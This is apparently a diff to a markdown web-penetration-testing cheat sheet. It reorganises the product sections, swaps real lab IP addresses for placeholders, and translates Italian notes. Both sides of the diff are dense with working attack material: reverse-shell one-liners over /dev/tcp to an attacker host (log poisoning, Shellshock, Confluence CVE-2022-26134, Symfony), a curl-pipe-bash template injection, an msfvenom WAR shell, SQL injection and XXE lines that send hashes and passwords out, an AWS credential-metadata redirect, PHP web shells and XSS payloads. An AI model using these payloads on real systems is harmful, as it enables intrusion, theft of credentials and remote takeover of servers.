@@ -28,39 +28,40 @@
 - [JWT Attacks](#jwt-attacks)
 - [OAuth authentication](#oauth-authentication)
 - [GraphQL](#graphql)
-- [WordPress](#wordpress)
-- [IIS - Internet Information Services](#iis---internet-information-services)
-- [Microsoft SharePoint](#microsoft-sharepoint)
-- [Lotus Domino](#lotus-domino)
-- [phpLDAPadmin](#phpldapadmin)
+- [APIs attacks](#apis-attacks)
 - [Git source code exposure](#git-source-code-exposure)
 - [Subdomain takeover](#subdomain-takeover)
 - [Second-Order Takeover](#second-order-takeover)
 - [4** Bypass](#4-bypass)
 - [Application level Denial of Service](#application-level-denial-of-service)
-- [APIs attacks](#apis-attacks)
-- [Grafana attacks](#grafana-attacks)
-- [Confluence attacks](#confluence-attacks)
-- [Kibana](#kibana)
-- [Argus Surveillance DVR](#argus-surveillance-dvr)
-- [Shellshock](#shellshock)
-- [Cassandra web](#cassandra-web)
-- [RaspAP](#raspap)
-- [Drupal](#drupal)
-- [Tomcat](#tomcat)
-- [Booked Scheduler](#booked-scheduler)
-- [phpMyAdmin](#phpmyadmin)
-- [PHP](#php)
-- [Symphony](#symphony)
-- [Adobe ColdFusion](#adobe-coldfusion)
-- [Webmin](#webmin)
 - [Broken Link Hijacking](#broken-link-hijacking)
-- [Log4Shell](#log4shell)
-- [Spring Boot](#spring-boot)
-- [Apache](#apache)
-- [Cisco](#cisco)
-- [Citrix](#citrix)
-- [Adobe Experience Manager](#adobe-experience-manager)
+- [Product-specific vulnerabilities](#product-specific-vulnerabilities)
+  - [WordPress](#wordpress)
+  - [Drupal](#drupal)
+  - [IIS - Internet Information Services](#iis---internet-information-services)
+  - [Microsoft SharePoint](#microsoft-sharepoint)
+  - [Lotus Domino](#lotus-domino)
+  - [Tomcat](#tomcat)
+  - [Apache](#apache)
+  - [Spring Boot](#spring-boot)
+  - [Log4Shell](#log4shell)
+  - [Shellshock](#shellshock)
+  - [Grafana](#grafana)
+  - [Confluence](#confluence)
+  - [Kibana](#kibana)
+  - [phpMyAdmin](#phpmyadmin)
+  - [phpLDAPadmin](#phpldapadmin)
+  - [PHP](#php)
+  - [Symphony](#symphony)
+  - [Adobe ColdFusion](#adobe-coldfusion)
+  - [Adobe Experience Manager](#adobe-experience-manager)
+  - [Webmin](#webmin)
+  - [Booked Scheduler](#booked-scheduler)
+  - [RaspAP](#raspap)
+  - [Argus Surveillance DVR](#argus-surveillance-dvr)
+  - [Cassandra web](#cassandra-web)
+  - [Cisco](#cisco)
+  - [Citrix](#citrix)
 
 
 
@@ -161,7 +162,7 @@
 **DNS Lookup**
 - `x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://wggnzi1futt3lvlzdsfuiwfdg4mvapye.oastify.com/"> %remote;]>'),'/l') FROM dual--`
 - `x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.chx30y2vv9ujmbmfe8gajcgthknbb6zv.oastify.com/"> %remote;]>'),'/l') FROM dual--`
-- `' OR 1=1 ; exec master.dbo.xp_dirtree '\\192.168.49.239\test';--`
+- `' OR 1=1 ; exec master.dbo.xp_dirtree '\\<ATTACKER_IP>\test';--`
   - Useful with `sudo responder -I tun0` to take hashes from Windows OS
 
 **HTML Encoding**
@@ -325,14 +326,14 @@ File inclusion vulnerabilities allow an attacker to include a file into the appl
 **Local File Inclusion (LFI)**: execute a local file
 
 - Try `zip://`, `php://` and other wrappers
-  - With `zip://` you can achieve RCE. Example: `http://192.168.190.229/index.php?file=zip:///var/www/html/uploads/upload_1692869993.zip%23php-reverse-shell.php`
+  - With `zip://` you can achieve RCE. Example: `http://<TARGET_IP>/index.php?file=zip:///var/www/html/uploads/upload.zip%23php-reverse-shell.php`
 
 Apache's access.log contamination
 1. Once found a LFI, read the Apache's access.log `http://victim.com/page.php?file=<PAYLOAD>`
    - Use `C:\xampp\apache\logs\access.log` or `../../../../../../../../../var/log/apache2/access.log`
 2. Notice which values from requests are saved. Contaminate Apache logs by sending this payload `<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>` in the User-Agent
 3. Execute a RCE with `http://victim.com/page.php?file=<apache/access.log>&cmd=ipconfig`. It will load the contaminated logs and perform an RCE thanks to `shell_exec($_GET['cmd'])`
-4. Run a reverse shell using a listener `nc -nvlp 4444` and in `&cmd` use `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22`
+4. Run a reverse shell using a listener `nc -nvlp <PORT>` and in `&cmd` use `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<ATTACKER_IP>%2F<PORT>%200%3E%261%22`
 
 **Remote File Inclusion (RFI)**: execute a remote file
 - An example: `http://<VICTIM>/menu.php?file=http://<ATTACKER>/evil.php`
@@ -535,7 +536,7 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
 - You can use combinations of these techniques together.
 
 **Other tips**
-- By combining it with an [Open redirection](#open-redirection), you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
+- By combining it with an [Open redirection](#open-redirection), you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://<INTERNAL_IP>:8080/admin/delete?username=carlos`
 - For AWS, bypass some restrictions by hosting this PHP page [[Reference](https://hackerone.com/reports/508459)]
   ```PHP
   <?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
@@ -677,7 +678,7 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
 - **Try with xinclude to achieve SSRF or LFI**
   ```xml
   <?xml version="1.0" encoding="utf-8" ?>
-  <username xmls:xi="https://w3.org/2001/XInclude">
+  <username xmlns:xi="https://w3.org/2001/XInclude">
     <xi:include parse="text" href="file:///c:/windows/win.ini">
   </username>
   ```
@@ -709,7 +710,7 @@ Manually testing for XXE vulnerabilities generally involves
 - Basic payload
   ```xml
   <?xml version="1.0" encoding="UTF-8" ?>
-  <!DOCTYPE writeup [<!ENTITY xxe SYSTEM "http://10.10.14.38/ping.php" >]>
+  <!DOCTYPE writeup [<!ENTITY xxe SYSTEM "http://<ATTACKER_IP>/ping.php" >]>
   <writeup>&xxe;</writeup>
   ```
 
@@ -1184,10 +1185,10 @@ ${{7*7}}
 
 Python
 - try then `{{config}}` and `{{{{{}.__class__.__base__.__subclasses__()}}}}`
-- `python3 client.py '{{{}.__class__.__base__.__subclasses__()[400]("curl 192.168.45.237/shell.sh | bash", shell=True, stdout=-1).communicate()[0].decode()}}'`
+- `python3 client.py '{{{}.__class__.__base__.__subclasses__()[400]("curl <ATTACKER_IP>/shell.sh | bash", shell=True, stdout=-1).communicate()[0].decode()}}'`
   - shell.sh
     ```bash
-    bash -i >& /dev/tcp/192.168.118.9/8080 0>&1
+    bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
     ```
 
 Razor
@@ -1422,97 +1423,20 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
 ```
 
 
+## APIs attacks
 
-## WordPress
+Common API path convention: `/api_name/v1`
 
-- Information Disclosure [high]: `/_wpeprivate/config.json`
-- Data exposure:
-  - `/wp-json/wp/v2/users/`
-  - `/wp-json/th/v1/user_generation`
-  - `/?rest_route=/wp/v2/users`
-- Register:
-  - `http://192.168.157.166/wp-login.php?action=register`
-  - `http://192.168.157.166/wp-signup.php`
-- xmlrpc.php enabled, [reference](https://hackerone.com/reports/138869). Send a post request to this endpoint with a body like this:
-  ```xml
-  <?xml version="1.0" encoding="utf-8"?>
-  <methodCall>
-  <methodName>system.listMethods</methodName>
-  <params></params>
-  </methodCall>
-  ```
-- Use [Nuclei](https://github.com/projectdiscovery/nuclei) to detect WordPress websites from a list of targets with: `nuclei -l subdomains.txt -t %USERPROFILE%/nuclei-templates/technologies/wordpress-detect.yaml`
-- Scan with WPScan [github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan) with
-  - `wpscan --url <domain> --enumerate u` enumerate users
-  - `wpscan --url <domain> -U users.txt -P password.txt` try to find valid credentials
-  - `wpscan --url <domain> --api-token <your-api-token>`
-  - `wpscan --url <target> --enumerate p --plugins-detection aggressive -o results`
-  - `wpscan --url https://example[.]com --api-token <api token> --plugins-detection mixed -e vp,vt,cb,dbe,u1-10 --force` [[source]](https://twitter.com/TakSec/status/1671202550844993543)
-- Nuclei templates `%USERPROFILE%\nuclei-templates\vulnerabilities\wordpress`
-- If you login as admin, you can achieve RCE
-  - modify the theme in 'Appearance' > 'Theme Editor'
-  - add `<?php exec("whoami")?>`
-- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
-- Check `wp-config.php`
-- Find outdated plugins and use searchsploit
+### Bruteforce APIs paths with gobuster
 
-**Resources**
-- https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/WordPress.md
-- https://www.rcesecurity.com/2022/07/WordPress-Transposh-Exploiting-a-Blind-SQL-Injection-via-XSS/
-- [WordPress Checklist](https://github.com/pentesterzone/pentest-checklists/blob/master/CMS/WordPress-Checklist.md)
-
-
-
-## IIS - Internet Information Services
-
-- Check if `trace.axd` is enabled
-- Search for
-  ```
-  Views/web.config
-  bin/WebApplication1.dll
-  System.Web.Mvc.dll
-  System.Web.Mvc.Ajax.dll
-  System.Web.Mvc.Html.dll
-  System.Web.Optimization.dll
-  System.Web.Routing.dll
-  ```
-- [Other common files](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#common-files)
-- Microsoft IIS 6.0, many RCE and BoF
-  - https://www.exploit-db.com/exploits/41738
-  - `exploit/windows/iis/iis_webdav_scstoragepathfromurl`
-- Tilde / shortname enumeration
-  1. [200 expected] `curl --silent -v -X OPTIONS "http://10.10.10.93/idontexist*~.*" 2>&1 | grep "HTTP/1.1"`
-  2. [404 expected] `curl --silent -v -X OPTIONS "http://10.10.10.93/aspnet~1.*" 2>&1 | grep "HTTP/1.1"`
-  3. `java -jar /home/kali/Documents/web-attack/IIS-ShortName-Scanner/release/iis_shortname_scanner.jar 2 20 http://10.10.10.93 /home/kali/Documents/web-attack/IIS-ShortName-Scanner/release/config.xml`
-  		- [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
-		- Check also [IIS Tilde Enumeration Scanner](https://portswigger.net/bappstore/523ae48da61745aaa520ef689e75033b) for Burp Suite
-- IIS file extensions https://learn.microsoft.com/en-us/previous-versions/2wawkw1c(v=vs.140)?redirectedfrom=MSDN
-
-
-**Resources**
-- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
-- Wordlist [iisfinal.txt](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#iis-discovery-bruteforce)
-
-## Microsoft SharePoint
-
-- Go to `http://target.com/_layouts/viewlsts.aspx` to see files shared / Site Contents
-
-## Lotus Domino
-
-- Find Lotus Domino with nuclei: `%USERPROFILE%\nuclei-templates\technologies\lotus-domino-version.yaml`
-- Exploit DB: [Lotus-Domino](https://www.exploit-db.com/search?q=Lotus+Domino)
-- Fuzzing list: [SecLists/LotusNotes.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/LotusNotes.fuzz.txt)
-
-
-
-## phpLDAPadmin
-
-- Endpoint: `phpldapadmin/index.php`
-- Try default logins
-- XSS
-  - `cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27Orwa%27)%3C/ScRiPt%3E&meth=ajax&server_id=1`
-  - `cmd.php?server_id=<script>alert('Orwa')</script>`
-- See [Godfather Orwa's tweet](https://twitter.com/GodfatherOrwa/status/1701392754251563477)
+1. Create a pattern file
+   ```
+   echo {GOBUSTER}/v1 > patterns
+   echo {GOBUSTER}/v2 >> patterns
+   echo {GOBUSTER}/v3 >> patterns
+   ```
+2. Run the command `gobuster dir -u <TARGET> -w /usr/share/wordlists/wordlist.txt -p patterns`
+3. Inspect the endpoints found with `curl` and use recursion
 
 
 
@@ -1573,77 +1497,166 @@ Read also [Second-Order Takeover: Scoring High Rewards by nocley](https://medium
   - Sending a reset link might disable an user's account, spam to prevent the user from accessing their account
   - Multiple wrong passwords might disable an user's account
 
-## APIs attacks
 
-Common API path convention: `/api_name/v1`
+## Broken Link Hijacking
 
-### Bruteforce APIs paths with gobuster
-
-1. Create a pattern file
-   ```
-   echo {GOBUSTER}/v1 > patterns
-   echo {GOBUSTER}/v2 >> patterns
-   echo {GOBUSTER}/v3 >> patterns
-   ```
-2. Run the command `gobuster dir -u <TARGET> -w /usr/share/wordlists/wordlist.txt -p patterns`
-3. Inspect the endpoints fuond with `curl` and use recursion
+Resources:
+- [Hunting for Broken Link Hijacking (BLH)](https://www.cobalt.io/blog/hunting-for-broken-link-hijacking-blh)
+- [Broken Link Hijacking - Mr. User-Agent](https://shahjerry33.medium.com/broken-link-hijacking-mr-user-agent-cd124297f6e6)
+- [Broken Link Checker](https://www.deadlinkchecker.com/website-dead-link-checker.asp)
+- [stevenvachon/broken-link-checker](https://github.com/stevenvachon/broken-link-checker)
+- [socialhunter](https://github.com/utkusen/socialhunter)
 
 
-## Grafana attacks
+
+## Product-specific vulnerabilities
+
+### WordPress
+
+- Information Disclosure [high]: `/_wpeprivate/config.json`
+- Data exposure:
+  - `/wp-json/wp/v2/users/`
+  - `/wp-json/th/v1/user_generation`
+  - `/?rest_route=/wp/v2/users`
+- Register:
+  - `http://<TARGET_IP>/wp-login.php?action=register`
+  - `http://<TARGET_IP>/wp-signup.php`
+- xmlrpc.php enabled, [reference](https://hackerone.com/reports/138869). Send a post request to this endpoint with a body like this:
+  ```xml
+  <?xml version="1.0" encoding="utf-8"?>
+  <methodCall>
+  <methodName>system.listMethods</methodName>
+  <params></params>
+  </methodCall>
+  ```
+- Use [Nuclei](https://github.com/projectdiscovery/nuclei) to detect WordPress websites from a list of targets with: `nuclei -l subdomains.txt -t %USERPROFILE%/nuclei-templates/technologies/wordpress-detect.yaml`
+- Scan with WPScan [github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan) with
+  - `wpscan --url <domain> --enumerate u` enumerate users
+  - `wpscan --url <domain> -U users.txt -P password.txt` try to find valid credentials
+  - `wpscan --url <domain> --api-token <your-api-token>`
+  - `wpscan --url <target> --enumerate p --plugins-detection aggressive -o results`
+  - `wpscan --url https://example[.]com --api-token <api token> --plugins-detection mixed -e vp,vt,cb,dbe,u1-10 --force` [[source]](https://twitter.com/TakSec/status/1671202550844993543)
+- Nuclei templates `%USERPROFILE%\nuclei-templates\vulnerabilities\wordpress`
+- If you login as admin, you can achieve RCE
+  - modify the theme in 'Appearance' > 'Theme Editor'
+  - add `<?php exec("whoami")?>`
+- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
+- Check `wp-config.php`
+- Find outdated plugins and use searchsploit
+
+**Resources**
+- https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/WordPress.md
+- [WordPress Checklist](https://github.com/pentesterzone/pentest-checklists/blob/master/CMS/WordPress-Checklist.md)
+
+
+
+### IIS - Internet Information Services
+
+- Check if `trace.axd` is enabled
+- Search for
+  ```
+  Views/web.config
+  bin/WebApplication1.dll
+  System.Web.Mvc.dll
+  System.Web.Mvc.Ajax.dll
+  System.Web.Mvc.Html.dll
+  System.Web.Optimization.dll
+  System.Web.Routing.dll
+  ```
+- [Other common files](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#common-files)
+- Microsoft IIS 6.0, many RCE and BoF
+  - https://www.exploit-db.com/exploits/41738
+  - `exploit/windows/iis/iis_webdav_scstoragepathfromurl`
+- Tilde / shortname enumeration
+  1. [200 expected] `curl --silent -v -X OPTIONS "http://<TARGET_IP>/idontexist*~.*" 2>&1 | grep "HTTP/1.1"`
+  2. [404 expected] `curl --silent -v -X OPTIONS "http://<TARGET_IP>/aspnet~1.*" 2>&1 | grep "HTTP/1.1"`
+  3. `java -jar iis_shortname_scanner.jar 2 20 http://<TARGET_IP> config.xml`
+  		- [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
+		- Check also [IIS Tilde Enumeration Scanner](https://portswigger.net/bappstore/523ae48da61745aaa520ef689e75033b) for Burp Suite
+- IIS file extensions https://learn.microsoft.com/en-us/previous-versions/2wawkw1c(v=vs.140)?redirectedfrom=MSDN
+
+
+**Resources**
+- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
+- Wordlist [iisfinal.txt](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#iis-discovery-bruteforce)
+
+### Microsoft SharePoint
+
+- Go to `http://target.com/_layouts/viewlsts.aspx` to see files shared / Site Contents
+
+### Lotus Domino
+
+- Find Lotus Domino with nuclei: `%USERPROFILE%\nuclei-templates\technologies\lotus-domino-version.yaml`
+- Exploit DB: [Lotus-Domino](https://www.exploit-db.com/search?q=Lotus+Domino)
+- Fuzzing list: search for `LotusNotes.fuzz.txt` in [SecLists](https://github.com/danielmiessler/SecLists)
+
+
+
+### phpLDAPadmin
+
+- Endpoint: `phpldapadmin/index.php`
+- Try default logins
+- XSS
+  - `cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27Orwa%27)%3C/ScRiPt%3E&meth=ajax&server_id=1`
+  - `cmd.php?server_id=<script>alert('Orwa')</script>`
+- See [Godfather Orwa's tweet](https://twitter.com/GodfatherOrwa/status/1701392754251563477)
+
+
+### Grafana
 
 **CVE-2021-43798**: Grafana versions 8.0.0-beta1 through 8.3.0, except for patched versions, are vulnerable to directory traversal
 - `curl --path-as-is http://<TARGET>:3000/public/plugins/alertlist/../../../../../../../../etc/passwd`
   - Check also for sqlite3 database `/var/lib/grafana/grafana.db` and `conf/defaults.ini` config file
 
 
-## Confluence attacks
+### Confluence
 
 
-### CVE-2022-26134
+#### CVE-2022-26134
 
 1. See: [Active Exploitation of Confluence CVE-2022-26134](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/)
 2. `curl http://<Confluence-IP>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/<YOUR-IP>/<YOUR-PORT>%200%3E%261%27%29.start%28%29%22%29%7D/`
 3. Run a listener `nc -nvlp 4444`
 
 
-## Kibana
+### Kibana
 
 - RCE https://github.com/mpgn/CVE-2019-7609
 - If you are unable to get code execution reset the machine and try again in a incognito browser window.
 - Remember run the payload on Timelion and then navigate Canvas to trigger it
 
 
-## Argus Surveillance DVR
+### Argus Surveillance DVR
 
-- LFI: `http://192.168.212.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=%22`
+- LFI: `http://<TARGET_IP>:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=%22`
 - Password located at `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini`
   - weak password encryption
-  - l'exploit trova un carattere per volta. Non funziona con i caratteri speciali > se trovi 'Unknown' significa che `e un carattere speciale e lo devi scoprire manualmente
+  - the exploit finds one character at a time. It doesn't work with special characters > if you find 'Unknown' it means it's a special character and you need to discover it manually
   
 
-## Shellshock
+### Shellshock
 
 - If you find `/cgi-bin/`, search for extensions `sh`, `cgi`, `py`, `pl` and more
-- `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.49.124/1234 0>&1' http://192.168.124.87/cgi-bin/test.sh`
+- `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' http://<TARGET_IP>/cgi-bin/test.sh`
 
 
-## Cassandra web
+### Cassandra web
 
 - `pip install cqlsh`
 - `cqlsh <IP>`
-- `sudo /usr/local/bin/cassandra-web -u cassie -p SecondBiteTheApple330 -B 0.0.0.0:4444`
-  - runnato come root, puoi vedere tutti i file del sistema
+- `sudo /usr/local/bin/cassandra-web -u <USER> -p <PASSWORD> -B 0.0.0.0:4444`
+  - if running as root, you can read all files on the system
   - `curl --path-as-is localhost:4444/../../../../../../../../etc/passwd`
 - https://book.hacktricks.xyz/network-services-pentesting/cassandra
 - https://medium.com/@manhon.keung/proving-grounds-practice-linux-box-clue-c5d3a3b825d2
 
 
-## RaspAP
+### RaspAP
 
-- `http://192.168.157.97:8091/includes/webconsole.php`
+- `http://<TARGET_IP>:8091/includes/webconsole.php`
 
 
-## Drupal
+### Drupal
 
 - Enumerate version by seeing `/CHANGELOG.txt`
 - Enumerate modules and search for specific vulnerabilities
@@ -1662,23 +1675,23 @@ Drupal 7.x and PHP Filter RCE
 
 
 
-## Tomcat
+### Tomcat
 
 - Default creds
   - `tomcat:s3cret`
   - https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
 - File uploads in tomcat/manager
-  1. `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.30 LPORT=4445 -f war > shell.war`
-  2. Go to `http://10.10.10.85/shell`
+  1. `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war > shell.war`
+  2. Go to `http://<TARGET_IP>/shell`
 
 
-## Booked Scheduler
+### Booked Scheduler
 
 - 2.7.5 RCE: https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF
-- LFI: `http://192.168.243.64:8003/booked/Web/admin/manage_email_templates.php?dr=template&lang=en_us&tn=../../../../../../../../../etc/passwd&_=1588451710324`
+- LFI: `http://<TARGET_IP>:8003/booked/Web/admin/manage_email_templates.php?dr=template&lang=en_us&tn=../../../../../../../../../etc/passwd&_=1588451710324`
 
 
-## phpMyAdmin
+### phpMyAdmin
 
 - Try `root` without password or `root:password`
 - If you can login, try this query for a RCE
@@ -1688,53 +1701,42 @@ Drupal 7.x and PHP Filter RCE
   ```
   
   
-## PHP
+### PHP
 
 - Command Execution - `preg_replace()` PHP Function Exploit - RCE https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4
 - `<?php echo system($_GET['cmd']); ?>`
 - [Type juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
 
 
-## Symphony
+### Symphony
 
 - [Symphony | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/symphony)
 - http://victim.com/app_dev.php/_profiler/open?file=app/config/parameters.yml
   - get the 'secret'
 - https://github.com/ambionics/symfony-exploits
-  - `python3 secret_fragment_exploit.py 'http://192.168.164.233/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.164.233/_fragment' --function system --parameters "bash -c 'bash -i >& /dev/tcp/192.168.45.154/80 0>&1'"`
+  - `python3 secret_fragment_exploit.py 'http://<TARGET_IP>/_fragment' --method 2 --secret '<SECRET>' --algo 'sha256' --internal-url 'http://<TARGET_IP>/_fragment' --function system --parameters "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'"`
 
 
-## Adobe ColdFusion
+### Adobe ColdFusion
 
 - See if you find `/CFIDE` or `.cfm` pages
 - It usually runs on port `8500`
 - RCE: https://www.exploit-db.com/exploits/50057
 
 
-## Webmin
+### Webmin
 
 - https://github.com/MuirlandOracle/CVE-2019-15107
   - type 'shell' to get a reverse shell (use ncat with rlwrap)
 
 
-## Broken Link Hijacking
-
-Resources:
-- [Hunting for Broken Link Hijacking (BLH)](https://www.cobalt.io/blog/hunting-for-broken-link-hijacking-blh)
-- [Broken Link Hijacking - Mr. User-Agent](https://shahjerry33.medium.com/broken-link-hijacking-mr-user-agent-cd124297f6e6)
-- [Broken Link Checker](https://www.deadlinkchecker.com/website-dead-link-checker.asp)
-- [stevenvachon/broken-link-checker](https://github.com/stevenvachon/broken-link-checker)
-- [socialhunter](https://github.com/utkusen/socialhunter)
-
-
-
-## Log4Shell
+### Log4Shell
 
 - Payload: `Referer: ${jndi:ldap://h${hostname}.BURPCOLLABORATOR/s2test}`
 
 
 
-## Spring Boot
+### Spring Boot
 
 - Check `/env` for RCE, `/heapdump` for private keys
 - Check also `/jolokia`
@@ -1746,7 +1748,7 @@ Resources
 
 
 
-## Apache
+### Apache
 
 **Misconfiguration leading to SSRF**
 
@@ -1765,7 +1767,7 @@ Resources:
 - [Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
 
 
-## Cisco
+### Cisco
 
 **CVE-2020-3580**
 ```html
@@ -1784,14 +1786,14 @@ Resources:
 </html>
 ```
  
-## Citrix
+### Citrix
 
 **CVE-2023-24488**
 ```
 https://domain/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>
 ```
 
-## Adobe Experience Manager
+### Adobe Experience Manager
 
 - `/jcr:content.json` returns the content of a page node itself
 - `.ext.json` returns the JSON representation of a specific child node or content component
